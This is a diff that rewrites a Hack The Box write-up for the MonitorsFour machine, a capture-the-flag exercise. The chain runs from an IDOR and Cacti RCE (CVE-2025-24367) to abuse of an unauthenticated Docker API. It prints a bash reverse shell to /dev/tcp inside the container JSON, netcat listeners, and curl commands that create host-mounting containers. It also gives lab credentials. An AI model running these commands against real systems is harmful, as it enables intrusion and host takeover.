@@ -1,200 +1,207 @@
+![Pwned](images/Pwned.png)
+
 ### Attack Path Summary
 
 IDOR → Credential Disclosure → Cacti RCE → Container Access → Docker API Abuse → Host Filesystem Mount → Administrator Flag
 
-### 1.Reconnaissance
+---
 
-Initial reconnaissance on the target 10.10.11.98
+## 1. Reconnaissance
+
+Initial reconnaissance on the target 10.10.11.98:
 
 ```bash
 nmap -sCV -T4 -A <Target_IP> -o filename
 ```
 
-![alt text](images/nmap.png)
+![nmap](images/nmap.png)
 
-Port 80/tcp -- http service(nginx server)
-5985/tcp -- WinRM (Windows Remote Management)
+- **Port 80/tcp** — HTTP service (nginx server)
+- **Port 5985/tcp** — WinRM (Windows Remote Management)
 
+There is nothing of note on the website.
 
-There is nothing fishy on the website.
-![alt text](images/website.png)
+![website](images/website.png)
 
-### 2.Enumeration
+---
 
-## Direcorty enumeration
+## 2. Enumeration
 
-I wanted to see if there are any useful endpoints.
+### 2.1 Directory Enumeration
+
+To discover useful endpoints, directory fuzzing was performed:
 
 ```bash
 ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://monitorsfour.htb/FUZZ -ac
 ```
-![alt text](images/directory2.png)
 
-We found user endpoint.
-Let's check it
+![directory](images/directory2.png)
 
-![alt text](images/user-endpoint.png)
+A `/user` endpoint was discovered. Navigating to it returned an error indicating a missing `token` parameter.
 
-So according to the error message, 'token' parameter is missing.
-So, I just tried using token=0 in the url and it worked. 
-This is an IDOR (Insecure Direct Object Reference) vulnerability.. It is a critical vulnerabilty , which will reveal sensitive information.
+![user-endpoint](images/user-endpoint.png)
 
-![alt text](images/data.png)
+Testing with `token=0` in the URL returned valid user data. This is an **IDOR (Insecure Direct Object Reference)** vulnerability — the backend failed to validate token ownership or enforce any authorization checks, allowing arbitrary token values (including `0`) to return sensitive user data. Tokens appear to be sequentially assigned integers, making them trivially predictable.
 
-The backend failed to validate token ownership or enforce authorization checks, allowing arbitrary token values (including 0) to return sensitive user data.
+![data](images/data.png)
 
-Passwords are hashed using MD5.
-Since the passwords were hashed using unsalted MD5, they were vulnerable to fast dictionary-based cracking using public hash databases.
-We can crack them using crackstation.net.
+The returned passwords were hashed using unsalted MD5, making them vulnerable to fast dictionary-based cracking via public hash databases such as crackstation.net.
 
-![alt text](images/crackstation.png)
+![crackstation](images/crackstation.png)
 
-Now we have both username and password.
+Valid credentials were obtained from the cracked hashes.
 
-I tried to login into monitorsfour.htb but it didn't work. 
-Since there is another http service on port 5985, I tried Host enumeration
+### 2.2 Host Enumeration
 
-## Host Enumeration
+Attempting to log in directly at `monitorsfour.htb` with the recovered credentials did not succeed. Since port 5985 was also open, virtual host enumeration was performed to discover additional services:
 
 ```bash
 ffuf -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/dirb/wordlists/big.txt -ac
 ```
-![alt text](images/host-enumeration.png)
 
-Add it to /etc/hosts file (cacti.monitorsfour.htb).
+![host-enumeration](images/host-enumeration.png)
 
-![alt text](images/cacti.png)
+A subdomain `cacti.monitorsfour.htb` was discovered. It was added to `/etc/hosts` and navigated to.
 
-We are now on login page. Let's try to login with cedentials we got before.
-Username: admin
-Password: wonderful1
+![cacti](images/cacti.png)
 
-However this did not succeed, indicating the username doesnot match.
-Using the additional profile information exposed by the API, specifically the administrator's name Marcus Higgins and email address, I tested a small set of plausible username variations.
+Logging in with `admin / wonderful1` failed, indicating the username was incorrect. Using additional profile information exposed by the IDOR endpoint — specifically the administrator's name (Marcus Higgins) and email address — a small set of plausible username variations was tested.
 
-After a few attempts, authentication was successful using the following credentials: 
-Username: marcus
-Password: wonderful1
+Authentication succeeded with:
 
-### 3.Exploitation
+- **Username:** marcus
+- **Password:** wonderful1
 
-## Vulnerability Identification
+---
 
-We can see the cacti version being displayed in both login page and dashboard. This narrowed the scope for vulnerability search.
+## 3. Exploitation
 
-![alt text](images/dashboard.png)
+### 3.1 Vulnerability Identification
 
-A review of known issues affecting this version revealed CVE-2025-24367, a critical vulnerability impacting Cacti versions ≤ 1.2.28. 
+The Cacti version was visible on both the login page and the dashboard.
 
-This vulnerability allows authenticated users to achieve remote code execution through command injection in the Graph Template functionality due to improper sanitization of user-supplied input passed to rrdtool.
+![dashboard](images/dashboard.png)
 
-## Exploit Preparation
+The installed version was **Cacti 1.2.28**. A review of known vulnerabilities for this version revealed **CVE-2025-24367**, a critical flaw affecting Cacti versions ≤ 1.2.28.
 
-with a confirmed vulnerable cacti version and poc available, I prepared the exploit. I began by cloning the github poc repository to my attacking machine.
+This vulnerability allows authenticated users to achieve remote code execution through command injection in the Graph Template functionality, caused by improper sanitization of user-supplied input passed to `rrdtool`.
 
-```bash 
+### 3.2 Exploit Preparation
+
+With a confirmed vulnerable Cacti version and a proof-of-concept available, the exploit was prepared by cloning the repository to the attacking machine:
+
+```bash
 git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
 cd CVE-2025-24367-Cacti-PoC
 ```
-This repository contains a ready to use exploit targeting CVE-2025-24367.
 
+### 3.3 Remote Code Execution
 
-Before using the exploit start a listner on port 4444
-## Remote Code Execution
-
-Setup a listner on port 4444 to catch an incoming reverse shell.
+A listener was started on port 4444 to catch the incoming reverse shell:
 
 ```bash
 nc -lnvp 4444
 ```
-Now execute the public proof-of-concept exploit from the cloned repository. You can check the syntax for it the repository.
+
+The proof-of-concept exploit was then executed:
 
 ```bash
 sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i 10.10.14.145 -l 4444
 ```
-![alt text](images/exploit.png)
 
-We recieved a reverse shell on port 4444.
+![exploit](images/exploit.png)
 
-![alt text](images/reverse.png)
+A reverse shell was received on port 4444.
 
-The shell landed as the www-data user inside the Cacti web directory, providing an initial foothold on the machine.
+![reverse](images/reverse.png)
 
-### Obtaining User flag
+The shell landed as the `www-data` user inside the Cacti web directory, providing an initial foothold on the machine.
 
-After gaining shell on the target, I first confirmed the context of my access. Running basic identification commands showed that the shell was operating as the lowest privileged www-data user.
+### 3.4 Obtaining the User Flag
+
+After gaining shell access, the context was confirmed using basic identification commands:
+
 ```bash
 whoami
 id
 ```
-I then enumereated the /home directory to identify valid local userson the system. This revealed a home directory for  user 'marcus', which aligned the credentials previously used to access the Cacti application.
+
+The `/home` directory was enumerated to identify valid local users on the system:
 
 ```bash
-la -la /home
+ls -la /home
 ```
-Futher navigating into the /home/marcus directory revealed user.txt file. This file is world-readable.
-Reading the contents of the file user.txt successfully revealed the user flag.
-![alt text](images/user.png)
 
-### Privilege Escalation
+This revealed a home directory for user `marcus`, consistent with the credentials used earlier. Navigating into `/home/marcus` revealed a world-readable `user.txt` file containing the user flag.
 
-Observing the system hostname, it follows a hexadecimal format similar to a Docker container ID, which immediately suggests that the shell is likely running inside a containerized environment.
+![user](images/user.png)
 
-Additionally, the sudo command is unavailable, further indicating a restricted execution context rather than a full virtual machine.
+---
 
-To validate this assumption, I examined the network configuration. The assigned IP address falls within the 172.18.0.0/16 range, and the default gateway is 172.18.0.1, which is characteristic of a Docker bridge network.
+## 4. Privilege Escalation
 
-These indicators confirm that the current shell is operating inside a Docker container, marking this as the starting point for the Sexton privilege escalation phase, where the objective is to identify potential container escape vectors or misconfigurations that could lead to host-level access.
+### 4.1 Container Identification
 
-![alt text](images/privilege1.png)
+The system hostname followed a hexadecimal format similar to a Docker container ID, immediately suggesting a containerized environment. The `sudo` command was also unavailable, further indicating a restricted execution context.
 
-Since the shell was running inside a Docker container, I proceeded to inspect /etc/reslov.conf. In containerised environment, this is file is automatically generated by docker engine and defines the DNS resolver used by the container. Inspecting this file is a standard enumeraton step, as it often reveals the internal network configuration and may disclose the host-side IP address used by Docker. This information can be leveraged to guide internal network enumeration and identify potential container escape paths.
+Network configuration confirmed this — the assigned IP address fell within the `172.18.0.0/16` range with a default gateway of `172.18.0.1`, characteristic of a Docker bridge network.
 
-The resolver configuration revealed the Docker host IP (192.168.65.7), which became a natural target for further service enumeration.
+![privilege1](images/privilege1.png)
 
-![alt text](images/docker-dns.png)
+### 4.2 Host IP Discovery
 
-Since unauthenticated Docker APIs have historically been exposed on TCP port 2375, I tested the host IP for an accessible Docker Engine endpoint.
+Inspecting `/etc/resolv.conf` revealed internal DNS configuration automatically generated by the Docker engine. In containerized environments, this file often discloses the host-side IP address used by Docker.
 
-To check whether the Docker Engine Remote API was exposed on the host, I issued the following request from within the container:
+The resolver configuration revealed the Docker host IP: **192.168.65.7**.
+
+![docker-dns](images/docker-dns.png)
+
+### 4.3 Docker API Exposure
+
+Since unauthenticated Docker APIs have historically been exposed on TCP port 2375, the host was tested for an accessible Docker Engine endpoint:
 
 ```bash
 curl http://192.168.65.7:2375/version
 ```
-![alt text](images/docker-api.png)
 
-After confirming that the Docker Engine API is accessible without authentication, I began by enumerating the existing Docker images on the host.
+![docker-api](images/docker-api.png)
+
+The Docker Engine Remote API was confirmed to be accessible without authentication. When the Docker daemon is exposed this way:
+
+- Any user can create containers
+- Containers can mount arbitrary host paths
+- Containers can run in privileged mode
+- Host kernel protections are bypassed
+
+Controlling an unauthenticated Docker API is effectively equivalent to root access on the host.
+
+### 4.4 Enumerating Docker Images
+
+Available images on the host were enumerated through the API:
 
 ```bash
 curl http://192.168.65.7:2375/images/json | grep "RepoTags:\[[^]]*\]"
 ```
-To simplify analysis and identify usable images, I filtered the Docker API output to extract only image IDs and repository tags.
 
-![alt text](images/docker-images.png)
+![docker-images](images/docker-images.png)
 
-This revelead several locally available docker images.
+Several locally available Docker images were identified.
 
-Docker runs containers as root by default. When the Docker daemon is exposed without authentication:
->Any user can create containers
->Containers can mount arbitrary host paths
->Containers can run in privileged mode
->Host kernel protections are bypassed
-As a result, controlling the Docker API is equivalent to root access on the host.
+### 4.5 Malicious Container Creation
 
-## Maliclious Container Preparation
+An existing image (`docker_setup-nginx-php:latest`) was selected to avoid pulling new images, which could fail in restricted environments or generate detectable outbound traffic.
 
-I selected an already existing image (docker_setup-nginx-php:latest) to avoid pulling new images, which could fail in restricted environments or generate detectable outbound traffic.
+> **Note:** In WSL2 environments, the Windows host filesystem is exposed under `/mnt/host/c`, making it possible to directly access the Windows C drive from Linux containers. This is specific to the lab environment used here.
 
-In WSL2 environments, the Windows host filesystem is exposed under /mnt/host/c, making it possible to directly access the Windows C drive from Linux containers.
+A container configuration file was created on the attacking machine:
 
-Create the json file on the attacker machine.
-```bash
+```json
 {
   "Image": "docker_setup-nginx-php:latest",
   "Cmd": [
     "/bin/bash",
     "-c",
-    "bash -i >& /dev/tcp/tun-ip/port 0>&1"
+    "bash -i >& /dev/tcp/<tun-ip>/<port> 0>&1"
   ],
   "HostConfig": {
     "Binds": [
@@ -203,43 +210,66 @@ Create the json file on the attacker machine.
   }
 }
 ```
-This is an existing image,eliminating need for external image pulls and reducing detection risk.
+
+An HTTP server was started to deliver the file to the target:
+
 ```bash
 python3 -m http.server 8000
 ```
-Now run a http server on port 8000 and upload the json file on to victim machine.
+
+The file was fetched from within the container:
+
 ```bash
-curl http://tun-ip:8000/container.json -o container.json
+curl http://<tun-ip>:8000/container.json -o container.json
 ```
 
-## Creating the container via Docker API
+### 4.6 Obtaining the Root Flag
+
+The container was created via the Docker API:
 
 ```bash
 curl -H "Content-Type: application/json" -d @container.json http://192.168.65.7:2375/containers/create?name=pwned
 ```
 
-Start a listener on port 9999.
+A listener was started on port 9999:
+
 ```bash
 nc -lnvp 9999
 ```
-Now start the container and we will recieve call back on it.
 
-``bash
+The container was started, triggering the callback:
+
+```bash
 curl -X POST http://192.168.65.7:2375/containers/pwned/start
 ```
-By abusing the Docker Remote API, I obtained arbitrary filesystem access to the Windows host via a bind mount.
 
-Since full access to the Windows host filesystem was obtained, the next step was to locate the proof file. In Hack The Box Windows environments, the final flag is conventionally stored on the Desktop of the highest-privileged user. As the Administrator account represents the highest local privilege level, its Desktop directory was checked, leading to the discovery of the flag
+Full access to the Windows host filesystem was obtained via the bind mount. Since the final flag in HTB Windows environments is conventionally stored on the Administrator's Desktop, that path was checked directly:
 
 ```bash
 ls /host_root/Users/Administrator/Desktop/
 cat /host_root/Users/Administrator/Desktop/root.txt
 ```
-![alt text](images/root.png)
 
-### Root Cause Summary
+![root](images/root.png)
 
-- Insecure Direct Object Reference exposing administrator credentials
-- Outdated Cacti version vulnerable to authenticated RCE
-- Application running inside a Docker container
-- Unauthenticated Docker Remote API exposed on the host
+The root flag was successfully retrieved.
+
+---
+
+## 5. Lessons Learned
+
+This machine demonstrated how a chain of seemingly isolated weaknesses can result in full host compromise:
+
+- **IDOR** with predictable integer tokens is a critical misconfiguration that should never reach production — always validate token ownership server-side.
+- **Unsalted MD5** for password storage is trivially reversible; modern hashing algorithms like bcrypt or Argon2 should be used instead.
+- **Keeping software patched** matters — CVE-2025-24367 was a known, publicly exploited vulnerability in a version that had available patches.
+- **Exposing the Docker API without authentication** is equivalent to handing out root on the host. If the Docker socket or remote API must be exposed, it should be protected behind TLS mutual authentication at minimum.
+
+---
+
+## Root Cause Summary
+
+- Insecure Direct Object Reference exposing administrator credentials via predictable token values
+- Outdated Cacti version (1.2.28) vulnerable to authenticated RCE via CVE-2025-24367
+- Application running inside a Docker container with no isolation awareness
+- Unauthenticated Docker Remote API exposed on the host, enabling arbitrary container creation and host filesystem access
